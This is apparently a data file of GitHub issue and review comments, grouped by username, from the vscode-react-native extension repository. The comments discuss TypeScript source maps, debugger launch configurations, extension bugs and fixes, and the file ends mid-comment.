    "joewood": "Thanks for the response. It may be necessary to use a custom transformer for TypeScript. I'll keep investigating and post anything I find here.\n. Hi @hamiltonia \nI've had some limited success in getting this to work. The approach I'm looking at is to replace the react-native transformer with a version that supplies the babel option inputSourceMap. I patched the transform.js file from RN's packager in two places, one to set the option for Babel and the other to read in the map file:\n``` javascript\n/*\n * Copyright (c) 2015-present, Facebook, Inc.\n  /\n'use strict';\nconst babel = require('babel-core');\nconst externalHelpersPlugin = require('babel-plugin-external-helpers');\nconst fs = require('fs');\nconst makeHMRConfig = require('babel-preset-react-native/configs/hmr');\nconst resolvePlugins = require('babel-preset-react-native/lib/resolvePlugins');\nconst inlineRequiresPlugin = require('fbjs-scripts/babel-6/inline-requires');\nconst json5 = require('json5');\nconst path = require('path');\nconst getBabelRC = (function () {\n  let babelRC = null;\nreturn function _getBabelRC(projectRoots) {\n    if (babelRC !== null) {\n      return babelRC;\n    }\nbabelRC = { plugins: [] }; // empty babelrc\n\nlet projectBabelRCPath;\nif (projectRoots && projectRoots.length > 0) {\n  projectBabelRCPath = path.resolve(projectRoots[0], '.babelrc');\n}\n\nif (!projectBabelRCPath || !fs.existsSync(projectBabelRCPath)) {\n  babelRC = json5.parse(\n    fs.readFileSync(\n      path.resolve(__dirname, 'node_modules/react-native/packager/react-packager', 'rn-babelrc.json'))\n  );\n\n  // Require the babel-preset's listed in the default babel config\n  babelRC.presets = babelRC.presets.map((preset) => require('babel-preset-' + preset));\n  babelRC.plugins = resolvePlugins(babelRC.plugins);\n}\n\nreturn babelRC;\n\n};\n})();\n/*\n * Given a filename and options, build a Babel\n * config object with the appropriate plugins.\n /\nfunction buildBabelConfig(filename, options) {\n  const babelRC = getBabelRC(options.projectRoots);\nconst extraConfig = {\n    filename,\n    sourceFileName: filename,\n    // ADDED PATCH FOR INPUT SOURCE MAPS\n    inputSourceMap: options.inputSourceMap\n  };\n  let config = Object.assign({}, babelRC, extraConfig);\n// Add extra plugins\n  const extraPlugins = [externalHelpersPlugin];\nvar inlineRequires = options.inlineRequires;\n  var blacklist = inlineRequires && inlineRequires.blacklist;\n  if (inlineRequires && !(blacklist && filename in blacklist)) {\n    extraPlugins.push(inlineRequiresPlugin);\n  }\nconfig.plugins = extraPlugins.concat(config.plugins);\nif (options.hot) {\n    const hmrConfig = makeHMRConfig(options, filename);\n    config = Object.assign({}, config, hmrConfig);\n  }\nreturn Object.assign({}, babelRC, config);\n}\nfunction transform(src, filename, options) {\n  options = options || {};\nconst babelConfig = buildBabelConfig(filename, options);\nconst result = babel.transform(src, babelConfig);\nreturn {\n    ast: result.ast,\n    code: result.code,\n    map: result.map,\n    filename: filename,\n  };\n}\nmodule.exports = function (data, callback) {\n  // ADDED PATCH FOR INPUT SOURCE MAPS\n  if (fs.existsSync(data.filename + \".map\")) {\n    console.log(\"Adding Map for \" + data.filename);\n    data.options = data.options || {};\n    data.options.inputSourceMap = JSON.parse(fs.readFileSync(data.filename + \".map\").toString());\n    data.options.sourceMaps = true;\n  }\n  // END PATCH\n  let result;\n  try {\n    result = transform(data.sourceCode, data.filename, data.options);\n  } catch (e) {\n    callback(e);\n    return;\n  }\ncallback(null, result);\n};\n// export for use in jest\nmodule.exports.transform = transform;\n```\nAll this is doing is sending the mapfile data to babel if it exists as a .js.map file (bit of an assumption, but this is just for testing).  I can use this transform with VSCode if I change the RN Native Extension's Packager.start function. I simply add the arguments for the command line:\njavascript\n    .then(function () {\n        var args = [\"--port\", Packager.PORT,\"--transformer\",\"c:\\\\code\\\\app\\\\transform.js\"];\n        var childEnvForDebugging = Object.assign({}, process.env, { REACT_DEBUGGER: \"echo A debugger is not needed: \" });\nNote, there's a bug in RN where the transform module needs to specified with a full path.\nThis all seems to work OK, in that when I browse to look at the .map file in the browser the TypeScript source files are referenced correctly. However, the problem is that VSCode doesn't seem to be picking them up and loading the source files. Injecting a \"debugger\" statement just opens up the main bundle file. I've tried using sourceRoot and relative paths, but without success. So, it seems to be failing at the last step.  \nAny suggestions would be appreciated.  Thanks.\n. FYI - I tried debugging in DevTools, but I see the error \"Failed to Parse SourceMap\". However, this error could be related to the Chrome 51 bug logged here: https://bugs.chromium.org/p/chromium/issues/detail?id=611328 \n. Interesting. Maybe consider using an existing JSON comment loader, like: https://www.npmjs.com/package/json-comments \n. Is this now released as part of 0.1.6?\nTS Debugging still doesn't seem to work for me with this version. Is there an example project with this working? Any special settings for source maps required (e.g. inlineSourcemaps?)\n. OK, with a bit of experimenting I got this to work. I had to do a couple of things:\n- I used \"inlineSourceMap\":true in the tsconfig.json.\n- I made sure source maps were available for the root file (previously I had a JavaScript root JS file that simply required a separate TS file)\n. ",
    "forki": "when will we see the next release?\n. Thanks that's good enough for me. I'm way to deep down the wrong rabbit\nhole already ;-)\nOn Aug 9, 2016 8:07 PM, \"Jimmy Thomson\" notifications@github.com wrote:\n\nSoon\u2122\nWhile you wait for the official release, you can check out this repo and\nbuild it yourself.\n\u2014\nYou are receiving this because you commented.\nReply to this email directly, view it on GitHub\nhttps://github.com/Microsoft/vscode-react-native/issues/240#issuecomment-238639358,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AADgNBjffQiAqErR92LgPodAOFr9zpl8ks5qeMHVgaJpZM4Iqn0T\n.\n. Thanks!\n\nPlease consider to change that in the tutorial. \n. Sure. https://facebook.github.io/react-native/docs/getting-started.html\n. Thx for laying project philosophy. I think that's fine. \n. .fsx and .fs files would be needed. Thanks for investigating. This would be\nsuper useful.\nAm 30.08.2016 6:48 nachm. schrieb \"Jimmy Thomson\" <notifications@github.com\n\n:\nThanks for reporting this. It sounds like your source maps are correctly\nconfigured, since you say you can set a breakpoint in your .fsx file and\nhave execution stop, we just display the breakpoint location in the bundle\nrather than the original source. I suspect that this may be because we\ndon't claim to be able to debug fsx files, but we'll need to investigate\nfurther.\n\u2014\nYou are receiving this because you are subscribed to this thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/Microsoft/vscode-react-native/issues/295#issuecomment-243503615,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AADgNNwjMCdOJMAw4zaRylwyAVqXXVKvks5qlF7PgaJpZM4JwVwe\n.\n. (so VSCode is currently not compatible with v34?)\n. \n",
    "Flavien": "I'm still struggling to get breakpoints to light up in VS Code with TypeScript on a react-native project. I followed the instructions and set sourceMap to true in .babelrc.\nAm I missing something?. react-native start --transformer node_modules/react-native-sm-transformer fails with EISDIR: illegal operation on a directory, read. Is that broken? Can someone debug react-native with TypeScript at all?. When do you expect to release?. ",
    "agonzalezjr": "As long as that let's meet start through Xcode (to debug my native code), and then I shake to enable debug and attach, that would be awesome. \n. Lets me* (sorry typing from iPhone with autocorrect)\n. Yes I think being able to debug Javascript is the whole point on the request \ud83d\ude04  (since I launched from Xcode, I can already debug Obj-C/Swift from there \ud83d\ude09 )\n. Yes it does. That type of simple attach is what I would like to have :) \n. Thanks!\nOn Sun, Jun 12, 2016 at 1:29 PM Jimmy Thomson notifications@github.com\nwrote:\n\nLet me ask this another way to be clear: If you do not use VSCode and you\njust use the default react-native experience, does debugging in chrome meet\nyour needs? Because that will let you debug your application-logic\njavascript, but (I believe) it will not let you debug the interaction of\nyour JS with the native side of things.\nIf debugging with chrome meets your needs then it is relatively simple for\nus to support that kind of attach ourselves, otherwise I believe that it is\npossible for iOS and not android and needs some more extensive changes to\nhow debugging works.\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/Microsoft/vscode-react-native/issues/246#issuecomment-225449583,\nor mute the thread\nhttps://github.com/notifications/unsubscribe/AIjPNakSsnBqsu3kT5c4MeIu6dW6G857ks5qLEHegaJpZM4IxEFX\n.\n. Thanks. Can't wait to try it out!\n. @vinayakparmar92 I start my project running from Xcode, then in VSCode, I select \"Attach to iOS\" in the debug tab. If there isn't an \"Attach to iOS\" option, it might just mean you need to add a run configuration. This is done by clicking in the gear icon and selecting NativeScript. Good luck!\n\n\n\"Attach to iOS\" is in this image where it says \"Launch...\" noted by \"B\" \ud83d\ude09 . ",
    "PatoBeltran": "@agonzalezjr We just merged a PR for attaching to a packager running outside of VSCode (https://github.com/Microsoft/vscode-react-native/pull/250). Does this meet your scenario? \n. @digeff I was thinking in what you said the other day and I agree that \"external\" shouldn't be considered as a platform. So I refactored my implementation to take this into account. This also provided the feature that even if you use \"Debug iOS\" or \"Debug Android\" and a packager is already running it will attach to it, but also run the appropriate iOS or Android setup.\n. https://github.com/Microsoft/vscode-react-native/pull/262 fixes this. The idea is check for the existence of the react or react-native directory under .vscode/typings and only create them if they don't exist. This way you can modify them without having the extension overwrite the files.\n. @mroswald Thanks a lot for the contribution! This looks really good. Besides from @MSLaguana comment LGTM.\n. @kulmajaba thanks for noticing! We have a PR (https://github.com/Microsoft/vscode-react-native/pull/261) out to fix this\n. @MSLaguana agree. Also added a few other updates to the README.\n. @orta nice catch! Thanks for fixing it!\n. @Microsoft/cordova-tools can someone CR these changes?\n. @TimBarham do you have any more comments?\n. :shipit: \n. vscode.workspace.openTextDocument will return a thenable. This type should be compatible with our Q promises, therefore Q should be able to convert it.\n. What do you mean, instead of the return type of Q.Promise<any>? \n. EntryPointHandler().runApp( needs a projectRootPath, then I will still need the try/catch to handle argv parsing and call this from inside getReactNativeWorkspaceForFile().then(. Also, what should I use for app name (I suppose something like \"react-native-open-file\") and app version (reuse let version = JSON.parse(fs.readFileSync(path.join(__dirname, \"..\", \"..\", \"package.json\"), \"utf-8\")).version; used elsewhere) ?\n. Yes. Also, to support windows cmd, should I do another file and change the Env variable depending on the os, or is there a way to have both scripts in the same file?\n. It will actually select the whole line. This is the current behavior of vscode if you use the command code workspace -g file:number\n. Will it be cleaner to do something like this?\n```\n() => {\n    let filename: string = \"\";\n    let lineNumber: number = 1;\ntry {\n    const fileInfo = process.argv[2].split(\":\");\n    filename = fileInfo[0];\n    if (fileInfo.length >= 2) {\n        lineNumber = parseInt(fileInfo[1], 10);\n    }\n} catch (e) {\n    console.log(\"Unable to open file with args [\" + process.argv.join(\", \") + \"]\");\n    return;\n} finally {\n    getReactNativeWorkspaceForFile(filename).then(projectRootPath => {\n        const remoteExtensionServerPath = RemoteExtension.atProjectRootPath(projectRootPath);\n        return remoteExtensionServerPath.openFileAtLocation(filename, lineNumber);\n    }).done(() => {}, (reason) => {\n        console.log(reason);\n    });\n}\n\n}\n``\n. This has a bug. When the path to the file is from windows (C:\\path\\to\\file:1), thesplit(\":\")` doesn't give the desired behavior. I was thinking on handling this by doing something like: \n```\nif (process.argv[2].indexOf(\":\") == 1) {\n    filename = \"C:\" + fileInfo[1];\n    lineNumberIndex = 2;\n} else {\n    filename = fileInfo[0];\n    lineNumberIndex = 1;\n}\nif (fileInfo.length >= 2) {\n    lineNumber = parseInt(fileInfo[lineNumberIndex], 10);\n}\n```\nWhat do you guys think? @digeff @MSLaguana\n. By doing this I would loose the file in the reject message (because of the recursive nature of this method)\n. Yes, yesterday while testing it in windows I found out that vscode manages the workspace with c and RN gives it with C... Usually this shouldn't matter, because windows support both, but VSCode hashes the workspace path in order to identify it, so by having that one character different the whole hash is different.\n. Isn't it that if isReactNativeProject fails, then it will reject the promise with it's own type of error? Therefore different from the workspace not found that getPathForRNParentWorkspace will be responding with.\n. I don't know if this was intended, but DebuggingFailedInNodeWrapper and PlatformNotSupported have the same error code\n. I used any because it can be either string, number, boolean, array or object depending in what configuration the user is trying to read.\n. true, this is redundant because typeScriptLibPath will never be null.\n. I decided using \"all\", instead of \"both\" because in the future we could probably support more mobile platforms.\n. No specific reason, I saw it used on other places and followed it. Should I change it to Error?\n. I'm assuming that by rejecting the promise the process will terminate.\n. I tried using attach (instead of launch), but the project didn't build. Is there a set of rules somewhere I need to change to be able to use attach?\n. Yes, more specifically it's being used on line 72, 85, 92 and 128 of this same file, to start packager, get packager port, prewarm bundle and stop logcat.\n. @MSLaguana isn't it technically returning because we are calling .then(() => nodeAdapterRequest.call(debugSession, request, args))  instead of .then(() => { nodeAdapterRequest.call(debugSession, request, args)); }\n. This is a good use case, I will investigate if the args variable has also the platform, then just stop monitoring if the platform is android.\n. Ok. We already have this information stored in mobilePlatformOptions, so we could use this to compare.\n. Tested this and we should reference it early (on the constructor) so that our customized one doesn't get called.\n. The logic for executing processes should be centralized in commandExecutor.ts. Please refactor this to have a method that runs this react-native command and returns the version number (or lack of version, for non-react-native projects), so we can analyzing the meaning of that version in these two methods (and possibly other endpoints). You can use some logic similar to how we launch the packager (https://github.com/Microsoft/vscode-react-native/blob/master/src/common/commandExecutor.ts#L60) \n. We shouldn't be validating a specific version in this method, this should only check if the project is valid or no (react-native -v returns react-native: n/a - not inside a React Native project directory if the project is not valid). \n. The check for version 0.19.0 should only be in validateReactNativeVersion() (Where it was before). It doesn't make sense to check for a specific version in isReactNativeProject(). So yes, please remove it from here and just do the appropriate check to make sure this is a react-native project.\n. @MSLaguana following that exact logic I will also make entrypoint and entrypointComponent functions instead of getters.\n. I was thinking on this exact same thing, and that's why I decided to add the createOrOverrideExpJson to .vscode/vscodeExponent.json (which defaults to true). \nWe want to create a new exp.json everytime, because if the user updates the react-native version or the package name (in exponent words slug), we want to be able to update exp.json. But if the users needs to have their customized version of exp.json, then they can just change createOrOverrideExpJson to false and we will not create or overwrite exp.json \n. this cache doesn't get invalidated. I was working behind the assumption that updating RN was not part of a normal workflow, so basically to invalidate it the user should restart vscode. What do you suggest doing here?\n. I was thinking adding a \"using exponent\" section to the readme that shows how our integration works, maybe add an explanation of this in there.\n. I agree, specifically this will be shown after a big pile of packager messages, so it can be easy to miss.\n. All of the code in SampleExponentApplication/ is the one provided by exponentjs as their sample app. Should I be modifying their sample app? \n. This was after talking with @MSLaguana. Basically we don't want to ship our Samples with the extension.\n. why do we need the & {code?: string}?\n. In a couple of weeks exponentjs will change to create the account from their website. Update this when appropriate\n. This will also need to be updated when the account creation is changed\n. ",
    "vinayakparmar92": "@agonzalezjr @PatoBeltran  Can you guys please tell me how this can be done?. ",
    "bigdrum": "It seems the file in .vscode/typings/react-native would get replaced automatically when the editor restarts.\nI agreed the missing definition of NativeModules is an upstream issue though. I have found a workaround by importing it in a js file, then re-export it. \n. ",
    "mquandalle": "I also think this pane shouldn't be open on editor start\u2014especially for non-RN projects. Is it done on purpose or is it a bug with this extension? with VSCode?\n. ",
    "jokeyrhyme": "Think it's worth creating and upstream VSCode issue to discuss the behaviour of OutputChannel initialisation?\n. Great work! Thanks!\nAny indication of when this might be released? This isn't urgent for me, I'm just curious. :)\n. ",
    "joekim": "I'd love to started using the functionality. I've been waiting a while for a new release. Would it make sense to just grab this merge and start using it?\n. ",
    "tomauty": "@joewood can you post your tsconfig file? I can't seem to get this to work :(\n. ",
    "prashid": "Reported on VSCode\nhttps://github.com/Microsoft/vscode/issues/9160\n. ",
    "MikeBlair": "@MSLaguana, thanks for the quick response.  \nIt would be really nice if we could specifically specify workspace and scheme settings in the launch.json file.  If they are specified there, you can skip the part of your code that tries to determine what they are.  That would help for more complex workspace files.\n. @MSLaguana, sorry for the late response on this.  \nJust getting parity with how React Native currently works (chooses the project or workspace file automatically) would be a good first start.\nIdeally, we would eventually have an option to completely control the xcode command line argument for users who want more control.\n. ",
    "strefethen": "@MSLaguana any update on this? Seems pretty essential for working with Cocoapods as well where the pod is part of the workspace.\n. I'm happy with react-native's current behavior. My needs at this point aren't more specific than that.\n. ",
    "BretJohnson": "I implemented this in the restart_packager branch, PR #299 \n. That's a mistake, from me playing around with something. I just fixed it.\n. Fixed.\n. ",
    "erohin": "I update VSCode up to 1.5.0-insider and debugger is works fine now\n. ",
    "Riglerr": "Ok, i'll give this a try in a few hours and report back.\nCheers for the quick response\n. ",
    "orta": "Yep, just tried it now, 100% reproducible, based on the file uploaded on another computer, same VS Code / React-N setup\n\n. ",
    "mennenia": "This was tested on node version 6.1.0. \n. Thanks!\n. ",
    "aferust": "about 20 minutes a go, vscode displayed a pop up for update. It happened after update. Yes, React Native Tools extension is listed there. I tried reinstalling both the extension and VSCode. When I click 'gear' icon now, react native option is not displayed for newly created projects. And I cannot start any debug session for existing react native projects receiving \"Configured debug type 'reactnative' is not supported\".\n. deleting vsmobile.vscode-react-native-0.1.5 folder and reinstalling did not solve the problem. this is what I see in package.json now:\n        \"debuggers\": [\n            {\n                \"type\": \"reactnative\",\n                \"label\": \"React Native\",\n                \"program\": \"./out/debugger/nodeDebugWrapper.js\",\n                \"runtime\": \"node\",\n                \"enableBrekapointsFor\": {\n                    \"languageIds\": [\n                        \"javascript\",\n                        \"typescript\",\n                        \"javascriptreact\",\n                        \"typescriptreact\"\n                    ]\n                },\n. I appreciate your efforts. Hope, it is solved soon.\n. ",
    "pietgk": "I had the same issue, installing the insiders solved the issue\n. i am already using it,\nuntil now no occurring of the issue.\nif it appears ill let you know immediatly\nthx piet\n\nOn 21 Aug 2016, at 11:47, \u5510\u5148\u68ee(tangsir) notifications@github.com wrote:\n@pietgk https://github.com/pietgk Trying to install 1.5.0-insider and install react native tool.It work for me\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub https://github.com/Microsoft/vscode-react-native/issues/276#issuecomment-241248225, or mute the thread https://github.com/notifications/unsubscribe-auth/ABkQ5BicSp_VmIyixpBRv_cI8aUnmPvRks5qiB6ugaJpZM4JdKNS.\n. \n",
    "roura356a": "Installing the Insiders build has not fixed this issue for me. Any ideas?\nVersion 1.5.0-insider (1.5.0-insider)\n. ",
    "weinand": "@MSLaguana there is a typo in the enableBreakpointsFor attribute of the package.json. It is incorrectly spelled enableBrekapointsFor. I do not yet know whether this is the culprit... \n. @vladimir-kotikov this is related to Proxy objects: see https://github.com/Microsoft/vscode/issues/12749 \nWorkaround: use the experimental node debugger node2.. From @gmramaswamy on December 16, 2016 11:30\n@weinand Can you please help me understand where to specify this debugger \"node2\". i am using with vscode-react-native extension and in launch.json type is reactnative. please help. . @vladimir-kotikov aha, if your debug type is \"reactnative\" then you cannot switch to \"node2\" (and I will move this issue to the vscode-react-native extension).. How does your launch configuration look like?\nYou can always downgrade by installing the previous version from the VS Code website:\nhttps://code.visualstudio.com/updates/v1_13\nYou might want do disable auto-update by adding this to your settings: \"update.channel\": \"none\",. Or you are suffering from this:\nfrom the VS Code 1.14 release notes:\n\nIn this release, Node.js debugging will assume the \"inspector\" protocol whenever the runtimeExecutable attribute of a launch configuration is set. If you see your debug configurations failing, this change could be the reason. To fix this, you can either upgrade Node.js to version 8.x or you can explicitly force the use of the \"legacy\" protocol by adding \"protocol\": \"legacy\" to your launch configuration.\n. From @adyanced on July 12, 2017 8:45\n\nThis is launch.json:\njs\n{\n    \"version\": \"0.2.0\",\n    \"configurations\": [\n{\n    \"name\": \"Debug Android\",\n    \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n    \"type\": \"reactnative\",\n    \"request\": \"launch\",\n    \"platform\": \"android\",\n    \"sourceMaps\": true,\n    \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n},\n        {\n            \"name\": \"Debug iOS\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            \"type\": \"reactnative\",\n            \"request\": \"launch\",\n            \"platform\": \"ios\",\n            \"target\": \"iPhone 5s\",\n            \"sourceMaps\": true,\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n        },\n        {\n            \"name\": \"Attach to packager\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            \"type\": \"reactnative\",\n            \"request\": \"attach\",\n            \"sourceMaps\": true,\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n        },\n        {\n            \"name\": \"Debug in Exponent\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            \"type\": \"reactnative\",\n            \"request\": \"launch\",\n            \"platform\": \"exponent\",\n            \"sourceMaps\": true,\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n        }\n    ]\n}. You are using the React Native extension (which is not a standard part of VS Code).\nI'll move this issue to the React Native repository.. ",
    "tangkunyin": "@pietgk Trying to install 1.5.0-insider and install react native tool.It work for me\n. ",
    "octref": "Hi all. The fix is verified in VSCode Insider 1.5.0. You can download insider build or wait for the next release.\n. ",
    "litingjun2015": "Hi, I have similar issue 'Configured debug type 'reactnative' is not supported.'\nSoftware versions\nVSCode version: 1.11.2\nOS platform and version: OSX Sierra 10.12.3 \nReact Native version: 0.39.2. ",
    "iliaskarim": "I have this issue on VSCode 1.23.0 on macOS High Sierra 10.13.4: \nConfigured debug type 'reactnative' is not supported.. ",
    "navneetkarnani": "@ILI4S \nI Saw this on 1.23.0. Updated to 1.23.1 and the simulator launches.. ",
    "dlevine82": "Looks good!\n. Just had one minor comment, but otherwise looks like a good approach.\n. Why does projectName use camelCasing but neither filename nor filetype do? Not a big thing, just looks a little strange :)\n. ",
    "jmcginty": "@panarasi Is there a public view of the planned work items?\n. ",
    "sasivarnan": "We love to have this feature. Also I found that now we can develop UWP apps using Windows Standalone SDK without Visual Studio Code.\nI already raised an issue regarding this in react-native-windows repo.\nHope we will get this feature soon. Excited to build UWP apps in react-native using VS Code.\n\n(Screenshot taken from https://developer.microsoft.com/en-us/windows/downloads/windows-10-sdk)\n. @panarasi Any update on this ?. ",
    "leesolway": "This would be extremely helpful to have. . ",
    "ncomo11": "@panarasi Can you please share Launch.json for this as for me I am getting below error:\nwindows is not a valid platform\nFYI I am tracking this under separate issue if you have any input please update it:\nhttps://github.com/Microsoft/vscode-react-native/issues/719#issuecomment-395773872\n. ",
    "sam-n-johnston": "I am using the currently published version of the extension. \nSo I need to build the extension from source to get this to work?\n. On my windows I have:\n- React-Native VS Code extension version: not sure how to find this without the new extension button\n- VSCode: 1.2.1\n- OS platform and version: Windows 10\n- React Native version: 0.26.2\nI don't even have \"sourceMaps\": true in my .babelrc file on windows. It works just by installing the extension out of the box.\n. I also tested on another version of Ubuntu I have on another computer and it works perfectly. \n- React-Native VS Code extension version: Not sure...\n- VSCode: 1.3.1\n- OS platform and version: Ubuntu 14.04\n- React Native version: 0.31\n. OK, \nFianally I just needed to delete the node_modules folder and do npm install again. Now it started working as expected!\n. I have the exact same problem with a fresh project. I do react-native init AwesomeProject, then open it in VSCode, then start the debugging for android and I get the same error message. Then I run it in the terminal and it works as expected. . I now get this: \n[vscode-react-native] [Warning] Couldn't import script at <http://localhost:8081/index.android.bundle?platform=android&dev=true&hot=false&minify=false>. Debugging won't work: Try reloading the JS from inside the app, or Reconnect the VS Code debugger: path must be a string\n/Users/dev/.vscode/extensions/vsmobile.vscode-react-native-0.2.4/node_modules/q/q.js:155\n                throw e;\n                ^\nReferenceError: err is not defined\n    at /Users/dev/.vscode/extensions/vsmobile.vscode-react-native-0.2.4/out/debugger/appWorker.js:125:34\n    at _rejected (/Users/dev/.vscode/extensions/vsmobile.vscode-react-native-0.2.4/node_modules/q/q.js:844:24)\n    at /Users/dev/.vscode/extensions/vsmobile.vscode-react-native-0.2.4/node_modules/q/q.js:870:30\n    at Promise.when (/Users/dev/.vscode/extensions/vsmobile.vscode-react-native-0.2.4/node_modules/q/q.js:1122:31)\n    at Promise.__dirname.Promise.promise.promiseDispatch (/Users/dev/.vscode/extensions/vsmobile.vscode-react-native-0.2.4/node_modules/q/q.js:788:41)\n    at /Users/dev/.vscode/extensions/vsmobile.vscode-react-native-0.2.4/node_modules/q/q.js:556:49\n    at runSingle (/Users/dev/.vscode/extensions/vsmobile.vscode-react-native-0.2.4/node_modules/q/q.js:137:13)\n    at flush (/Users/dev/.vscode/extensions/vsmobile.vscode-react-native-0.2.4/node_modules/q/q.js:125:13)\n    at _combinedTickCallback (internal/process/next_tick.js:67:7)\n    at process._tickCallback (internal/process/next_tick.js:98:9)\nI'm not really sure how to interpret this.... Sorry, I was wondering where err was defined. \nThis is the updated info:\n[vscode-react-native] [Warning] Couldn't import script at <http://localhost:8081/index.android.bundle?platform=android&dev=true&hot=false&minify=false>. Debugging won't work: Try reloading the JS from inside the app, or Reconnect the VS Code debugger: path must be a string\n[vscode-react-native] \"AssertionError: path must be a string\n   at Module.require (module.js:497:3)\n   at require (/Users/dev/.vscode/extensions/vsmobile.vscode-react-native-0.2.4/out/debugger/appWorker.js:82:69)\n    at /Users/dev/code/AwesomeProject/.vscode/.react/index.android.bundle:72599:2\n    at ContextifyScript.Script.runInContext (vm.js:37:29)\n    at Object.exports.runInContext (vm.js:69:17)\n    at /Users/dev/.vscode/extensions/vsmobile.vscode-react-native-0.2.4/out/debugger/appWorker.js:97:16\n    at _fulfilled (/Users/dev/.vscode/extensions/vsmobile.vscode-react-native-0.2.4/node_modules/q/q.js:834:54)\n    at Promise.then.Q.nextTick.self.promiseDispatch.done (/Users/dev/.vscode/extensions/vsmobile.vscode-react-native-0.2.4/node_modules/q/q.js:863:30)\n    at Promise.__dirname.Promise.promise.promiseDispatch (/Users/dev/.vscode/extensions/vsmobile.vscode-react-native-0.2.4/node_modules/q/q.js:796:13)\n    at /Users/dev/.vscode/extensions/vsmobile.vscode-react-native-0.2.4/node_modules/q/q.js:857:14\"\nI'll try to look at the files mentionned.. It's from the freshly created project. \nYeah, I have global.require=_require; at line 65 of my index.android.bundle. My bundle seems weird, lots of empty lines. Here are the 70 first lines: \n```\n(function(global) {\nglobal.DEV=true;\nglobal.BUNDLE_START_TIME=Date.now();\n})(typeof global !== 'undefined' ? global : typeof self !== 'undefined' ? self : this);\n(function(global) {\n'use strict';\nglobal.require=_require;\nglobal.__d=define;\nvar modules=Object.create(null);\nif(DEV){\nvar verboseNamesToModuleIds=Object.create(null);\n}\n```\nHere are the last four lines of my index.android.bundle: \nmodule.exports=throwOnWrongReactAPI;\n}, 547, null, \"throwOnWrongReactAPI\");\n;require(192); // line 72599 that causes the problem. \n;require(0);\n//# sourceMappingURL=index.android.map\nI just installed nodeJS LTS 6.9.2 and relaunched the fresh project and I get the same problem. . Commenting that line resolved the problem. I can now run my app correctly. Breakpoints also work correctly. \nBut I guess this is just a temporary fix, as you said. Let me know if you have clues or ideas that I could try to make it work. Thanks for the help!. ",
    "JoseFMP": "For me this issue persists.. ",
    "levito": "Same here. \nAfter downgrading VSCode to 1.3.1 and deleting ${workspaceRoot}/.vscode, the debug environment will be created and works.\nWhen upgrading VSCode to 1.4.0 afterwards, debugging fails with the error: The configured debug type \"reactnative\" is not supported.\n. First, after installing the insider build and opening the project, it worked again (the debugging environment created by VSCode 1.3.1 was reused). \nAfter a reboot, it doesn't work anymore.\nSo I deleted the .vscode directory to have it recreated by VSCode: same issue as with VSCode 1.4.0 - the react native debugging environment won't be created.\n(edited)\n. I'm also still having this issue.\nThese are the steps I tried to see if it is/can be resolved:\n1. update VSCode Insiders build\n2. Fix the typo in the vscode-react-native extension (in ~/.vscode-insiders)\n3. Remove auto-generated directory .vscode and .tsconfig.json from my project\n4. Restarte VSCode Insiders build and open React Native project\nResult: there is still no .vscode/launch.json being created.\nDoing the same with VSCode 1.3.0 will create the .vscode/launch.json and debugging works with both iOS Simulator and Android (even with the typo in the vscode-react-native extension).\nMy setup:\n- Mac OS X 10.11.5\n- VSCode Insiders build 2f2d6502638fa108f8ddbcc5831b38a35d5a1c11 with these extensions:\n  - npm Intellisense 0.1.3\n  - Path Intellisense 1.0.2\n  - Flow language support 0.0.3\n  - Color Highlight 1.2.1\n  - React Native Tools 0.1.5\n  - ReactJS Code Snippets 1.1.1\n- Node 5.11.0 with NPM 3.8.6\n- flow 0.27.0\n- Project: React Native 0.30.0\n. Yep, that's it. Uninstalling Flow language support makes debugging work again. But unfortunately this also disables flow type checking (VSCode itself only understands vanilla JS and TypeScript when I set \"javascript.validate.enable\": true, and the other available flow extension (vscode-flow 276.1.0) also breaks debugging). So I'll stick with VSCode 1.3.0 for now.\n. ",
    "tapir": "I'm still having this issue. You can repro by having a clean install of 1.4.\n. @levito it's fixed on VScode side. For now you can uninstall flow plugin. that's the culprit.\n. A simple node.js application gives the same error as well. I've triple checked that node.exe is on PATH and it works on the command line by simply invoking \"node\".\n. I was recommended to put an absolute path to the node.exe within launch.json and indeed it works for a node app. In node apps it's the \"runtimeExecutable\" property but how can I set it in react-native apps' launch.json?\n. It's indeed fixed. Thank you.\n. ",
    "girvo": "Has this bug been fixed? This is a pretty big mark against using Code for React Native, as Flow is pretty integral to it.\n. It might be unrelated, but I ran into a similar bug. Disabling the \"Flow\" language support extension (or vscode-flow, depending) made it work again for me. Might not be the same bug, but thought I'd mention it just in case!\n. ",
    "AndyIsaacson": "v4.3.1 - thanks!\n. Thanks @MSLaguana !  I grabbed master and built it - breakpoints work fine.  \nJust curious, what component is actually building the sourcemaps?  Is it babel?  Node?  Is there a different version that I could have used that wouldn't have made sourcemaps with sections?  Still learning this ecosystem :-)\n. ",
    "jeanregisser": "Yes VSCode was already open. I used it to start a debug session of the RN app.\n. I also found the cause of the symbolication failing: https://github.com/facebook/react-native/issues/9605\nIt wasn't caused by this extension.\n. Tried that but It didn't work directly.\nI noticed the args passed to the editor are not always the same.\nPrinting the actual args just after https://github.com/facebook/react-native/blob/35e7a266db1927d6b3efd5e8b43394518ec86f59/local-cli/server/util/launchEditor.js#L156 I can see that if I click on a stack trace item, sometimes it has the workspace as 1st argument and actual file as 2nd argument.\nBut for some other items on the trace (where it can't find the workspace, see https://github.com/facebook/react-native/blob/35e7a266db1927d6b3efd5e8b43394518ec86f59/local-cli/server/util/launchEditor.js#L125), it's just the filename as 1st argument.\nSo I also had to tweak https://github.com/Microsoft/vscode-react-native/blob/32c742e72a2ef65827562d72e370382f95f61849/scripts/atom#L19 to account for this, as it was only passing 1 arg.\nSide note: somehow today I can't have symbolication fully working on a brand new react-native init MyProject from within vscode. It looks like it happens only when vscode is set as the remote debugger. I'll open a separate issue.\n. Specifically, when vscode is the remote debugger, if I click on any of 